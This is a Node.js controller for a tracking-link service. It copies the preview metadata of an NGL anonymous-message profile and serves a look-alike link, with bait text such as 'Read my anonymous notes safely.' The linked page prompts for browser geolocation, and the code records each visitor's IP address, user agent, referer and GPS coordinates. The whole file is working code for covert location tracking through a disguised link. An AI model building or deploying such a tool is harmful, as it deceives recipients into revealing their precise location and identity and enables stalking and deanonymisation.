const { v4: uuid4 } = require('uuid');
const { getClientIp, scrapeNGLProfile } = require('../utils/utils.js');
const { IPinfoWrapper } = require('node-ipinfo');
const { TrackerModel: URLTracker } = require('../models/tracker.model.js');
const { VisitLogModel } = require('../models/visitor.model.js');

const ipinfoWrapper = new IPinfoWrapper(process.env.IPINFO_TOKEN_KEY);

const generateTrackingUrl = async (req, res) => {
  const { originalUrl } = req.body;

  try {
    new URL(originalUrl);
  } catch (_) {
    return res.status(400).send('Invalid URL.');
  }

  const urlTrackingId = uuid4().split('-')[0];

  const ogTags = await scrapeNGLProfile(originalUrl);

  const tracker = new URLTracker({
    targetURL: originalUrl,
    trackingId: urlTrackingId,
    ogMetadata: ogTags,
  });

  await tracker.save();

  const trackingURL = `${req.protocol}://${req.get('host')}/api/v1/t/${urlTrackingId}`;

  return res.json({ trackingURL, urlTrackingId });
};

const getRealGeoLocation = async (req, res) => {
  const { trackingId } = req.params;
  const { latitude, longitude } = req.body;

  console.log(latitude, longitude);
  console.log(trackingId);

  const tracker = await URLTracker.findOne({ trackingId });
  if (!tracker) return res.status(404).json({ error: 'Tracking ID not found.' });

  const visitLog = new VisitLogModel({
    ip: getClientIp(req),
    userAgent: req.get('User-Agent'),
    referer: req.get('Referer'),
    trackerId: tracker._id,
    method: 'Browser-GPS',
    location: {
      type: 'Point',
      coordinates: [longitude, latitude], // GeoJSON [lon, lat]
    },
  });

  console.log(visitLog);

  await visitLog.save();
  tracker.logs.push(visitLog._id);
  await tracker.save();

  return res.status(200).json({ message: 'GPS recorded.' });
};

const getTrackedUrl = async (req, res) => {
  const { trackingId } = req.params;
  const tracker = await URLTracker.findOne({ trackingId }).populate('logs');

  if (!tracker) {
    return res.status(404).json({ message: 'Tracking link not found' });
  }

  console.log(tracker);

  // Store tracker ref for later logging
  req.trackerRef = tracker._id;

  const ogData = tracker.ogMetadata || {};

  // Optional improvement:
  // Serve rendered EJS page prompting HTML5 geolocation
  return res.render('geolocation-prompt', {
    trackingId: tracker.trackingId,
    targetUrl: tracker.targetURL,
    ogUrl: `${req.protocol}://${req.get('host')}/t/${trackingId}`,
    ogTitle: ogData.title || 'Anonymous Message',
    ogDescription: ogData.description || 'Read my anonymous notes safely.',
    ogImage: ogData.image,
  });
};

module.exports = { generateTrackingUrl, getTrackedUrl, getRealGeoLocation };
